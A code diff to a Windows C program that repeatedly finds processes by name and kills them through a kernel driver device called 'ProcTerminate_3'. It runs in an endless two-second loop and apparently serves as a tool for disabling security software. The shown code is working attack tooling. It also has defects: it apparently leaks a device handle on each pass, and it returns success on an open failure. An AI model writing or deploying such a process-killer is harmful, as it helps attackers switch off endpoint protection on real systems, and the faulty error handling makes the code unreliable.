@@ -67,13 +67,33 @@ DWORD findProc(LPCWSTR processName) {
 	return pid;
 }
 
-BOOL Kill(HANDLE hDevice, PCWSTR ProcName) {
+BOOL Kill(PCWSTR ProcName) {
 
 	DWORD pid = findProc(ProcName);
 
 	DWORD bytesReturned;
 	PROC_TERM ProcTerm;
 	ProcTerm.Pid = pid;
+
+	if (pid == 0) {
+		wprintf(L"[-] Process %ls not found.\n", ProcName);
+		return FALSE;
+	}
+
+	HANDLE hDevice = CreateFileW(
+		L"\\\\.\\ProcTerminate_3",
+		GENERIC_READ | GENERIC_WRITE,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		0
+	);
+
+	if (hDevice == INVALID_HANDLE_VALUE) {
+		wprintf(L"[-] Failed to open device: %d\n", GetLastError());
+		return 1;
+	}
 
 	BOOL success = DeviceIoControl(
 		hDevice,
@@ -106,28 +126,10 @@ int main(int argc, char* argv[]) {
 
 	DWORD proc_count = sizeof(process_names) / sizeof(process_names[0]);
 
-	HANDLE hDevice = CreateFileW(
-		L"\\\\.\\ProcTerminate_3",
-		GENERIC_READ | GENERIC_WRITE,
-		0,
-		NULL,
-		OPEN_EXISTING,
-		FILE_ATTRIBUTE_NORMAL,
-		0
-	);
-
-	if (hDevice == INVALID_HANDLE_VALUE) {
-		wprintf(L"[-] Failed to open device: %d\n", GetLastError());
-		return 1;
-	}
-
 	while (TRUE) {
 		for (size_t i = 0; i < proc_count; i++) {
-			
 			process_name = process_names[i];
-			if (!Kill(hDevice, process_name)) {
-				wprintf(L"[-] Failed to kill process %ls\n", process_name);
-			}
+			Kill(process_name);
 		}
 		Sleep(2000);
 	}
